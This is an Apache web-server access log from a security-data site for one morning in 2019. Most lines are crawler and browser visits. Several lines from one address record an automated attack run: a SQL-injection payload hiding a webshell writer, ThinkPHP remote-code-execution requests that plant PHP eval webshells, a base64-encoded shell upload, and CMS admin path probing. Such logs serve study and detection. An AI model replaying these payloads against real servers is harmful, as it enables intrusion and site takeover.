54.36.148.184 - - [01/Oct/2019:02:20:51 -0700] "GET /self.logs/error.log.2015-05-24.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.33 - - [01/Oct/2019:08:58:25 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1572 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
47.99.109.174 - - [01/Oct/2019:09:04:55 -0700] "GET /admin/editor/asp/upload_json.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin/editor/asp/upload_json.asp" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
96.244.142.130 - - [01/Oct/2019:09:16:12 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
96.244.142.130 - - [01/Oct/2019:09:16:13 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
96.244.142.130 - - [01/Oct/2019:09:16:13 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
96.244.142.130 - - [01/Oct/2019:09:16:13 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
96.244.142.130 - - [01/Oct/2019:09:16:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
98.222.3.201 - - [01/Oct/2019:09:17:21 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
98.222.3.201 - - [01/Oct/2019:09:17:21 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
98.222.3.201 - - [01/Oct/2019:09:17:21 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
98.222.3.201 - - [01/Oct/2019:09:17:21 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
98.222.3.201 - - [01/Oct/2019:09:17:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
117.34.91.148 - - [01/Oct/2019:09:18:35 -0700] "GET //include/taglib/datas.lib.php HTTP/1.1" 404 294 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:18:35 -0700] "GET //config/AspCms_Config.asp HTTP/1.1" 404 250 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:18:35 -0700] "GET //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 250 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:18:36 -0700] "GET //include/taglib/cheng.lib.php HTTP/1.1" 404 250 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:18:38 -0700] "GET //plus/moon.php HTTP/1.1" 404 250 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:18:38 -0700] "GET //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 250 "-" "-" 
113.171.224.176 - - [01/Oct/2019:09:22:58 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.171 - - [01/Oct/2019:09:24:28 -0700] "GET /self.logs/2016/error.log.2016-11-23.gz HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
117.34.91.148 - - [01/Oct/2019:09:29:33 -0700] "GET //Config_Shell.php HTTP/1.1" 301 507 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:29:33 -0700] "GET //plus/mytag_js.php?aid=9527 HTTP/1.1" 301 527 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:29:34 -0700] "GET //plus/moon.php HTTP/1.1" 301 445 "-" "-" 
117.34.91.148 - - [01/Oct/2019:09:29:38 -0700] "GET //plus/read.php HTTP/1.1" 301 445 "-" "-" 
54.36.148.137 - - [01/Oct/2019:09:31:53 -0700] "GET /self.logs/2015/access.log.2015-09-01.gz HTTP/1.1" 200 10431 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.10 - - [01/Oct/2019:09:39:00 -0700] "GET /self.logs/access.log.2015-07-05.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
172.83.43.131 - - [01/Oct/2019:09:43:16 -0700] "GET / HTTP/1.1" 200 12432 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
54.36.150.17 - - [01/Oct/2019:09:48:59 -0700] "GET /self.logs/access.log.2018-10-30.gz HTTP/1.1" 200 28059 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
220.181.51.115 - - [01/Oct/2019:09:50:43 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
220.181.51.113 - - [01/Oct/2019:09:50:45 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
52.204.97.54 - - [01/Oct/2019:09:56:04 -0700] "GET /robots.txt HTTP/1.1" 200 251 "http://www.sabinewiechmannfotografie.nl/" "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)" 
52.204.97.54 - - [01/Oct/2019:09:56:04 -0700] "GET / HTTP/1.1" 200 12394 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)" 
52.204.97.54 - - [01/Oct/2019:09:57:05 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1382 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:09:57:44 -0700] "GET / HTTP/1.1" 200 12431 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:09:57:44 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:09:57:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:09:57:44 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
106.120.173.159 - - [01/Oct/2019:09:58:39 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
52.204.97.54 - - [01/Oct/2019:09:58:41 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 211700 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
106.120.173.159 - - [01/Oct/2019:09:58:48 -0700] "GET / HTTP/1.1" 200 12394 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
146.91.48.16 - - [01/Oct/2019:09:58:58 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36" 
146.91.48.16 - - [01/Oct/2019:09:58:59 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36" 
146.91.48.16 - - [01/Oct/2019:09:58:59 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36" 
146.91.48.16 - - [01/Oct/2019:09:58:59 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36" 
146.91.48.16 - - [01/Oct/2019:09:59:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36" 
52.204.97.54 - - [01/Oct/2019:09:59:42 -0700] "GET /tg/a.zip HTTP/1.1" 200 213160 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:10:00:30 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 229220 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
54.36.149.80 - - [01/Oct/2019:10:00:51 -0700] "GET /self.logs/error.log.2017-04-07.gz HTTP/1.1" 200 773 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
52.204.97.54 - - [01/Oct/2019:10:01:17 -0700] "GET /pe_static/zeus.zip HTTP/1.1" 200 204400 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:10:02:09 -0700] "GET /scada/scada_logs.zip HTTP/1.1" 200 364923 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
216.244.66.245 - - [01/Oct/2019:10:02:46 -0700] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
52.204.97.54 - - [01/Oct/2019:10:03:48 -0700] "GET /self.logs/ HTTP/1.1" 200 18485 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:10:04:35 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 204400 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
122.241.205.61 - - [01/Oct/2019:10:04:43 -0700] "GET //user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:43 -0700] "GET //user.php?act=login HTTP/1.1" 404 271 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:44 -0700] "GET //d.php HTTP/1.1" 404 271 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:44 -0700] "POST //plus/moon.php HTTP/1.1" 404 271 "http://www.secrepo.com//plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:45 -0700] "POST //plus/mytag_js.php?aid=9090 HTTP/1.1" 404 271 "http://www.secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:45 -0700] "GET //type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 404 271 "http://www.secrepo.com//type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:46 -0700] "GET //data/cache_template/rss.tpl.php HTTP/1.1" 404 271 "http://www.secrepo.com//data/cache_template/rss.tpl.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:47 -0700] "GET //?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 200 46582 "http://www.secrepo.com//?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php @eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:48 -0700] "GET //robots1.php HTTP/1.1" 404 271 "http://www.secrepo.com//robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:49 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 200 46582 "http://www.secrepo.com//?" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:49 -0700] "GET //12345.php HTTP/1.1" 404 271 "http://www.secrepo.com//12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:50 -0700] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 200 46582 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:51 -0700] "GET //robots.php HTTP/1.1" 404 271 "http://www.secrepo.com//robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:52 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 200 46582 "http://www.secrepo.com//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:53 -0700] "GET //x.php HTTP/1.1" 404 271 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:53 -0700] "GET //SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 271 "http://www.secrepo.com//SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:54 -0700] "GET //SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1" 404 271 "http://www.secrepo.com//SiteFiles/SiteTemplates/sectest/include.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:54 -0700] "POST //index.php?s=index HTTP/1.1" 404 271 "http://www.secrepo.com//index.php?s=index" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:55 -0700] "GET //seeyon/test123456.jsp?pwd=asasd3344&cmd=godkey HTTP/1.1" 404 271 "http://www.secrepo.com//seeyon/test123456.jsp?pwd=asasd3344&cmd=godkey" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:56 -0700] "GET //index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1" 404 271 "http://www.secrepo.com//index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.241.205.61 - - [01/Oct/2019:10:04:56 -0700] "GET //uploadfile/member/0/0x0.php HTTP/1.1" 404 271 "http://www.secrepo.com//uploadfile/member/0/0x0.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
52.204.97.54 - - [01/Oct/2019:10:05:25 -0700] "GET / HTTP/1.1" 200 12431 "-" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:10:05:25 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:10:05:25 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
52.204.97.54 - - [01/Oct/2019:10:05:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'" 
54.36.148.43 - - [01/Oct/2019:10:09:40 -0700] "GET /self.logs/access.log.2017-04-06.gz HTTP/1.1" 200 31532 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
85.208.96.65 - - [01/Oct/2019:10:10:12 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.65 - - [01/Oct/2019:10:10:13 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
104.129.202.55 - - [01/Oct/2019:10:10:16 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
104.129.202.55 - - [01/Oct/2019:10:10:16 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
104.129.202.55 - - [01/Oct/2019:10:10:16 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
104.129.202.55 - - [01/Oct/2019:10:10:16 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
104.129.202.55 - - [01/Oct/2019:10:10:17 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
54.36.149.41 - - [01/Oct/2019:10:10:18 -0700] "GET /self.logs/2015/access.log.2015-11-07.gz HTTP/1.1" 200 5637 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
154.209.254.10 - - [01/Oct/2019:10:12:17 -0700] "HEAD /dede/login.php HTTP/1.1" 404 275 "-" "-" 
154.209.254.10 - - [01/Oct/2019:10:12:17 -0700] "HEAD /manager/login.php HTTP/1.1" 404 275 "-" "-" 
154.209.254.10 - - [01/Oct/2019:10:12:17 -0700] "HEAD /admin/login.php HTTP/1.1" 404 275 "-" "-" 
154.209.254.10 - - [01/Oct/2019:10:12:17 -0700] "HEAD /admindede/login.php HTTP/1.1" 404 275 "-" "-" 
154.209.254.10 - - [01/Oct/2019:10:12:17 -0700] "HEAD /manage/login.php HTTP/1.1" 404 275 "-" "-" 
154.209.254.10 - - [01/Oct/2019:10:12:18 -0700] "HEAD /htadmin/login.php HTTP/1.1" 404 231 "-" "-" 
85.208.96.65 - - [01/Oct/2019:10:22:13 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 481 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
216.244.66.245 - - [01/Oct/2019:10:22:13 -0700] "GET /self.logs/access.log.2018-10-06.gz HTTP/1.1" 200 16833 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [01/Oct/2019:10:22:16 -0700] "GET /self.logs/access.log.2018-11-27.gz HTTP/1.1" 200 20072 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
85.208.96.71 - - [01/Oct/2019:10:22:17 -0700] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.67 - - [01/Oct/2019:10:22:21 -0700] "GET /data HTTP/1.1" 301 427 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.67 - - [01/Oct/2019:10:22:22 -0700] "GET /data HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.71 - - [01/Oct/2019:10:23:06 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.67 - - [01/Oct/2019:10:23:11 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 301 499 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.68 - - [01/Oct/2019:10:23:31 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.70 - - [01/Oct/2019:10:24:05 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.71 - - [01/Oct/2019:10:24:10 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 301 493 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
85.208.96.70 - - [01/Oct/2019:10:24:40 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 301 507 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
